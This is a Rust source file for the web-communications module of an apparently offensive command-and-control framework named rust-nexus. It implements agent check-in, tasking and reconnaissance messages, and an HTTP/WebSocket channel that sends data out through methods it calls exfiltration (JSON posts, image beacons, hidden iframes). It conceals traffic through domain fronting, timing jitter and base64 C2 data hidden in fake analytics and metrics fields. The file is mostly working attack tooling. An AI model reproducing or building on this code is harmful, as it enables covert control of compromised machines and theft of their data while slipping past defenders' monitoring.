//! Nexus Web Communications Module
//!
//! Provides HTTP/WebSocket fallback communication methods integrating catch system's
//! data exfiltration techniques with rust-nexus's secure gRPC communication layer.

use std::collections::HashMap;
use serde::{Deserialize, Serialize};
use reqwest::Client;
use tokio_tungstenite::{connect_async, WebSocketStream, MaybeTlsStream};
use tokio::net::TcpStream;
use futures_util::{SinkExt, StreamExt};
use base64::{Engine as _, engine::general_purpose};
use log::{info, warn, error, debug};

pub mod http_fallback;
pub mod websocket_fallback;
pub mod domain_fronting;
pub mod traffic_obfuscation;

use nexus_common::*;
// Temporarily commented out due to compilation issues
// use nexus_infra::domain_manager::DomainManager;

/// Web communications configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebCommsConfig {
    pub primary_endpoints: Vec<String>,
    pub fallback_endpoints: Vec<String>,
    pub user_agents: Vec<String>,
    pub request_timeout: u64,
    pub max_retries: u32,
    pub jitter_ms: (u64, u64), // min, max jitter
    pub domain_fronting: DomainFrontingConfig,
    pub obfuscation: ObfuscationConfig,
    pub websocket: WebSocketConfig,
}

impl Default for WebCommsConfig {
    fn default() -> Self {
        Self {
            primary_endpoints: vec![
                "https://api.example.com/v1".to_string(),
                "https://cdn.example.com/assets".to_string(),
            ],
            fallback_endpoints: vec![
                "https://backup.example.com/api".to_string(),
            ],
            user_agents: vec![
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string(),
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15".to_string(),
            ],
            request_timeout: 30,
            max_retries: 3,
            jitter_ms: (1000, 5000),
            domain_fronting: DomainFrontingConfig::default(),
            obfuscation: ObfuscationConfig::default(),
            websocket: WebSocketConfig::default(),
        }
    }
}

/// Domain fronting configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DomainFrontingConfig {
    pub enabled: bool,
    pub front_domain: String,
    pub real_host: String,
    pub custom_headers: HashMap<String, String>,
}

impl Default for DomainFrontingConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            front_domain: "cloudflare.com".to_string(),
            real_host: "api.example.com".to_string(),
            custom_headers: HashMap::new(),
        }
    }
}

/// Traffic obfuscation configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ObfuscationConfig {
    pub enabled: bool,
    pub base64_encode: bool,
    pub compression: bool,
    pub fake_parameters: Vec<String>,
    pub legitimate_paths: Vec<String>,
}

impl Default for ObfuscationConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            base64_encode: true,
            compression: false,
            fake_parameters: vec![
                "utm_source=google".to_string(),
                "utm_medium=organic".to_string(),
                "ref=homepage".to_string(),
            ],
            legitimate_paths: vec![
                "/api/v1/status".to_string(),
                "/health".to_string(),
                "/metrics".to_string(),
                "/assets/js/app.js".to_string(),
            ],
        }
    }
}

/// WebSocket configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebSocketConfig {
    pub enabled: bool,
    pub heartbeat_interval: u64,
    pub reconnect_attempts: u32,
    pub reconnect_delay: u64,
}

impl Default for WebSocketConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            heartbeat_interval: 30,
            reconnect_attempts: 5,
            reconnect_delay: 10,
        }
    }
}

/// Communication message types (integrating catch exfiltration methods)
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", content = "data")]
pub enum WebCommsMessage {
    // Standard C2 messages
    AgentCheckin(AgentCheckinData),
    TaskRequest(String), // agent_id
    TaskResponse(TaskResponseData),

    // Reconnaissance integration
    FingerprintData(FingerprintData),
    ReconResults(ReconResultsData),

    // System messages
    Heartbeat(HeartbeatData),
    Error(ErrorData),

    // Obfuscated data (appears as legitimate traffic)
    Analytics(AnalyticsData),
    Metrics(MetricsData),
    AssetRequest(AssetRequestData),
}

/// Agent checkin data
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentCheckinData {
    pub agent_id: String,
    pub hostname: String,
    pub ip_address: String,
    pub platform: String,
    pub capabilities: Vec<String>,
    pub last_execution: Option<chrono::DateTime<chrono::Utc>>,
}

/// Task response data
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResponseData {
    pub agent_id: String,
    pub task_id: String,
    pub success: bool,
    pub output: String,
    pub error: Option<String>,
    pub execution_time: u64,
}

/// Browser fingerprinting data (from catch integration)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FingerprintData {
    pub agent_id: String,
    pub target_url: String,
    pub fingerprint: String, // JSON encoded fingerprint
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

/// Reconnaissance results data
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReconResultsData {
    pub agent_id: String,
    pub target: String,
    pub results: String, // JSON encoded results
    pub scan_type: String,
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

/// Heartbeat data
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HeartbeatData {
    pub agent_id: String,
    pub status: String,
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

/// Error data
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ErrorData {
    pub agent_id: String,
    pub error_type: String,
    pub message: String,
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

/// Obfuscated analytics data (appears legitimate)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnalyticsData {
    pub session_id: String,
    pub events: Vec<AnalyticsEvent>,
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

/// Analytics event (contains hidden data)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnalyticsEvent {
    pub event_type: String,
    pub properties: HashMap<String, String>, // Hidden C2 data here
}

/// Metrics data (system monitoring appearance)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MetricsData {
    pub service_name: String,
    pub metrics: HashMap<String, f64>,
    pub hidden_data: Option<String>, // Base64 encoded C2 data
}

/// Asset request data (file download appearance)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AssetRequestData {
    pub path: String,
    pub version: String,
    pub data: Option<String>, // Base64 encoded file or C2 data
}

/// Main web communications client
pub struct WebCommsClient {
    config: WebCommsConfig,
    http_client: Client,
    current_endpoint: String,
    websocket_connection: Option<WebSocketStream<MaybeTlsStream<TcpStream>>>,
}

impl WebCommsClient {
    /// Create a new web communications client
    pub fn new(config: WebCommsConfig) -> Result<Self> {
        let mut headers = reqwest::header::HeaderMap::new();

        // Set default headers for legitimate appearance
        headers.insert(reqwest::header::ACCEPT, "application/json, text/plain, */*".parse().unwrap());
        headers.insert(reqwest::header::ACCEPT_LANGUAGE, "en-US,en;q=0.9".parse().unwrap());
        headers.insert(reqwest::header::ACCEPT_ENCODING, "gzip, deflate, br".parse().unwrap());

        // Add domain fronting headers if enabled
        if config.domain_fronting.enabled {
            headers.insert(reqwest::header::HOST, config.domain_fronting.real_host.parse().unwrap());

            for (key, value) in &config.domain_fronting.custom_headers {
                headers.insert(
                    reqwest::header::HeaderName::from_bytes(key.as_bytes())
                        .map_err(|e| NexusError::ConfigurationError(format!("Invalid header name: {}", e)))?,
                    value.parse()
                        .map_err(|e| NexusError::ConfigurationError(format!("Invalid header value: {}", e)))?,
                );
            }
        }

        let http_client = Client::builder()
            .timeout(std::time::Duration::from_secs(config.request_timeout))
            .default_headers(headers)
            .build()
            .map_err(|e| NexusError::NetworkError(format!("Failed to create HTTP client: {}", e)))?;

        let current_endpoint = config.primary_endpoints.first()
            .unwrap_or(&"https://example.com".to_string())
            .clone();

        Ok(Self {
            config,
            http_client,
            current_endpoint,
            websocket_connection: None,
        })
    }

    /// Send a message using HTTP fallback methods (integrating catch techniques)
    pub async fn send_http(&mut self, message: WebCommsMessage) -> Result<String> {
        let mut last_error = None;
        let mut endpoints = self.config.primary_endpoints.clone();
        endpoints.extend(self.config.fallback_endpoints.clone());

        // Apply jitter
        self.apply_jitter().await;

        for endpoint in endpoints {
            for attempt in 0..self.config.max_retries {
                match self.send_http_to_endpoint(&endpoint, &message).await {
                    Ok(response) => return Ok(response),
                    Err(e) => {
                        warn!("HTTP send attempt {} to {} failed: {}", attempt + 1, endpoint, e);
                        last_error = Some(e);

                        if attempt < self.config.max_retries - 1 {
                            tokio::time::sleep(std::time::Duration::from_millis(
                                1000 * (attempt + 1) as u64
                            )).await;
                        }
                    }
                }
            }
        }

        Err(last_error.unwrap_or_else(|| {
            NexusError::NetworkError("All HTTP endpoints failed".to_string())
        }))
    }

    /// Send HTTP message to specific endpoint using catch exfiltration techniques
    async fn send_http_to_endpoint(&self, endpoint: &str, message: &WebCommsMessage) -> Result<String> {
        use crate::http_fallback::HttpExfiltration;

        let exfiltration = HttpExfiltration::new(&self.config);

        // Try multiple exfiltration methods (like catch system)
        let methods = vec![
            "post_json",
            "image_beacon",
            "hidden_iframe",
            "fetch_api",
        ];

        for method in methods {
            match exfiltration.exfiltrate_data(endpoint, message, method).await {
                Ok(response) => return Ok(response),
                Err(e) => {
                    debug!("Exfiltration method {} failed: {}", method, e);
                    continue;
                }
            }
        }

        Err(NexusError::NetworkError("All exfiltration methods failed".to_string()))
    }

    /// Send message via WebSocket
    pub async fn send_websocket(&mut self, message: WebCommsMessage) -> Result<()> {
        if self.websocket_connection.is_none() {
            self.establish_websocket_connection().await?;
        }

        let serialized = serde_json::to_string(&message)
            .map_err(NexusError::SerializationError)?;

        let obfuscated = if self.config.obfuscation.enabled {
            self.obfuscate_data(&serialized)?
        } else {
            serialized
        };

        if let Some(ws) = &mut self.websocket_connection {
            ws.send(tokio_tungstenite::tungstenite::Message::Text(obfuscated))
                .await
                .map_err(|e| NexusError::NetworkError(format!("WebSocket send failed: {}", e)))?;

            Ok(())
        } else {
            Err(NexusError::NetworkError("WebSocket connection not available".to_string()))
        }
    }

    /// Establish WebSocket connection
    async fn establish_websocket_connection(&mut self) -> Result<()> {
        for endpoint in &self.config.primary_endpoints {
            let ws_url = endpoint.replace("http://", "ws://").replace("https://", "wss://") + "/ws";

            match connect_async(&ws_url).await {
                Ok((ws_stream, _)) => {
                    info!("WebSocket connected to {}", ws_url);
                    self.websocket_connection = Some(ws_stream);
                    return Ok(());
                }
                Err(e) => {
                    warn!("WebSocket connection to {} failed: {}", ws_url, e);
                    continue;
                }
            }
        }

        Err(NexusError::NetworkError("Failed to establish WebSocket connection".to_string()))
    }

    /// Receive message from WebSocket
    pub async fn receive_websocket(&mut self) -> Result<Option<WebCommsMessage>> {
        if let Some(ws) = &mut self.websocket_connection {
            match ws.next().await {
                Some(Ok(msg)) => {
                    if let tokio_tungstenite::tungstenite::Message::Text(text) = msg {
                        let deobfuscated = if self.config.obfuscation.enabled {
                            self.deobfuscate_data(&text)?
                        } else {
                            text
                        };

                        let message: WebCommsMessage = serde_json::from_str(&deobfuscated)
                            .map_err(NexusError::SerializationError)?;

                        return Ok(Some(message));
                    }
                }
                Some(Err(e)) => {
                    error!("WebSocket receive error: {}", e);
                    self.websocket_connection = None;
                }
                None => {
                    info!("WebSocket connection closed");
                    self.websocket_connection = None;
                }
            }
        }

        Ok(None)
    }

    /// Apply random jitter between requests
    async fn apply_jitter(&self) {
        let jitter_range = self.config.jitter_ms.1 - self.config.jitter_ms.0;
        // Use a simple time-based pseudo-random value instead of rand
        let time_seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos() as u64;
        let jitter = self.config.jitter_ms.0 + (time_seed % jitter_range);

        tokio::time::sleep(std::time::Duration::from_millis(jitter)).await;
    }

    /// Obfuscate data for transmission
    fn obfuscate_data(&self, data: &str) -> Result<String> {
        use crate::traffic_obfuscation::DataObfuscator;

        let obfuscator = DataObfuscator::new(&self.config.obfuscation);
        obfuscator.obfuscate(data)
    }

    /// Deobfuscate received data
    fn deobfuscate_data(&self, data: &str) -> Result<String> {
        use crate::traffic_obfuscation::DataObfuscator;

        let obfuscator = DataObfuscator::new(&self.config.obfuscation);
        obfuscator.deobfuscate(data)
    }

    /// Send message with automatic fallback (HTTP -> WebSocket -> Retry)
    pub async fn send_with_fallback(&mut self, message: WebCommsMessage) -> Result<String> {
        // Try HTTP first
        match self.send_http(message.clone()).await {
            Ok(response) => return Ok(response),
            Err(e) => {
                warn!("HTTP communication failed: {}", e);
            }
        }

        // Fallback to WebSocket
        if self.config.websocket.enabled {
            match self.send_websocket(message.clone()).await {
                Ok(_) => return Ok("WebSocket message sent".to_string()),
                Err(e) => {
                    warn!("WebSocket communication failed: {}", e);
                }
            }
        }

        Err(NexusError::NetworkError("All communication methods failed".to_string()))
    }

    /// Create a legitimate-looking message for obfuscation
    pub fn create_obfuscated_message(&self, data: &str) -> WebCommsMessage {
        use uuid::Uuid;

        // Hide C2 data in analytics events
        let mut properties = HashMap::new();
        properties.insert("page_url".to_string(), "/dashboard".to_string());
        properties.insert("user_id".to_string(), Uuid::new_v4().to_string());
        properties.insert("session_duration".to_string(), "1234".to_string());

        // Hide actual data in a property that looks legitimate
        properties.insert("tracking_data".to_string(),
            general_purpose::STANDARD.encode(data));

        WebCommsMessage::Analytics(AnalyticsData {
            session_id: Uuid::new_v4().to_string(),
            events: vec![AnalyticsEvent {
                event_type: "page_view".to_string(),
                properties,
            }],
            timestamp: chrono::Utc::now(),
        })
    }

    /// Extract hidden data from obfuscated message
    pub fn extract_hidden_data(&self, message: &WebCommsMessage) -> Result<Option<String>> {
        match message {
            WebCommsMessage::Analytics(analytics) => {
                for event in &analytics.events {
                    if let Some(tracking_data) = event.properties.get("tracking_data") {
                        let decoded = general_purpose::STANDARD
                            .decode(tracking_data)
                            .map_err(|e| NexusError::ConfigurationError(format!("Base64 decode error: {}", e)))?;
                        return Ok(Some(String::from_utf8_lossy(&decoded).to_string()));
                    }
                }
            }
            WebCommsMessage::Metrics(metrics) => {
                if let Some(hidden) = &metrics.hidden_data {
                    let decoded = general_purpose::STANDARD
                        .decode(hidden)
                        .map_err(|e| NexusError::ConfigurationError(format!("Base64 decode error: {}", e)))?;
                    return Ok(Some(String::from_utf8_lossy(&decoded).to_string()));
                }
            }
            _ => {}
        }

        Ok(None)
    }
}

/// Web communications server (for C2 infrastructure)
pub struct WebCommsServer {
    config: WebCommsConfig,
}

impl WebCommsServer {
    /// Create a new web communications server
    pub fn new(config: WebCommsConfig) -> Self {
        Self { config }
    }

    /// Start the web communications server
    pub async fn start(&self, bind_address: &str, port: u16) -> Result<()> {
        use crate::http_fallback::HttpServer;

        let server = HttpServer::new(self.config.clone());
        server.start(bind_address, port).await
    }

    /// Handle incoming web communication
    pub async fn handle_message(&self, message: WebCommsMessage) -> Result<WebCommsMessage> {
        match message {
            WebCommsMessage::AgentCheckin(checkin) => {
                info!("Agent checkin from {}", checkin.agent_id);
                // Process agent registration
                Ok(WebCommsMessage::Heartbeat(HeartbeatData {
                    agent_id: checkin.agent_id,
                    status: "registered".to_string(),
                    timestamp: chrono::Utc::now(),
                }))
            }
            WebCommsMessage::TaskResponse(response) => {
                info!("Task response from {}: {}", response.agent_id, response.task_id);
                // Process task result
                Ok(WebCommsMessage::Heartbeat(HeartbeatData {
                    agent_id: response.agent_id,
                    status: "task_complete".to_string(),
                    timestamp: chrono::Utc::now(),
                }))
            }
            WebCommsMessage::FingerprintData(fingerprint) => {
                info!("Fingerprint data from {}", fingerprint.agent_id);
                // Store reconnaissance data
                Ok(WebCommsMessage::Heartbeat(HeartbeatData {
                    agent_id: fingerprint.agent_id,
                    status: "data_received".to_string(),
                    timestamp: chrono::Utc::now(),
                }))
            }
            _ => {
                // Default response for other message types
                Ok(WebCommsMessage::Error(ErrorData {
                    agent_id: "server".to_string(),
                    error_type: "unsupported_message".to_string(),
                    message: "Message type not supported".to_string(),
                    timestamp: chrono::Utc::now(),
                }))
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_webcomms_config_default() {
        let config = WebCommsConfig::default();
        assert!(config.obfuscation.enabled);
        assert!(config.websocket.enabled);
        assert_eq!(config.request_timeout, 30);
        assert_eq!(config.max_retries, 3);
    }

    #[test]
    fn test_message_serialization() {
        let checkin = WebCommsMessage::AgentCheckin(AgentCheckinData {
            agent_id: "test-agent".to_string(),
            hostname: "test-host".to_string(),
            ip_address: "192.168.1.100".to_string(),
            platform: "linux".to_string(),
            capabilities: vec!["shell".to_string()],
            last_execution: None,
        });

        let serialized = serde_json::to_string(&checkin).unwrap();
        let deserialized: WebCommsMessage = serde_json::from_str(&serialized).unwrap();

        match deserialized {
            WebCommsMessage::AgentCheckin(data) => {
                assert_eq!(data.agent_id, "test-agent");
                assert_eq!(data.hostname, "test-host");
            }
            _ => panic!("Wrong message type"),
        }
    }

    #[test]
    fn test_obfuscated_message_creation() {
        let config = WebCommsConfig::default();
        let client = WebCommsClient::new(config).unwrap();

        let message = client.create_obfuscated_message("secret data");

        match message {
            WebCommsMessage::Analytics(analytics) => {
                assert_eq!(analytics.events.len(), 1);
                assert!(analytics.events[0].properties.contains_key("tracking_data"));
            }
            _ => panic!("Expected analytics message"),
        }
    }

    #[tokio::test]
    async fn test_client_creation() {
        let config = WebCommsConfig::default();
        let client = WebCommsClient::new(config);
        assert!(client.is_ok());
    }
}
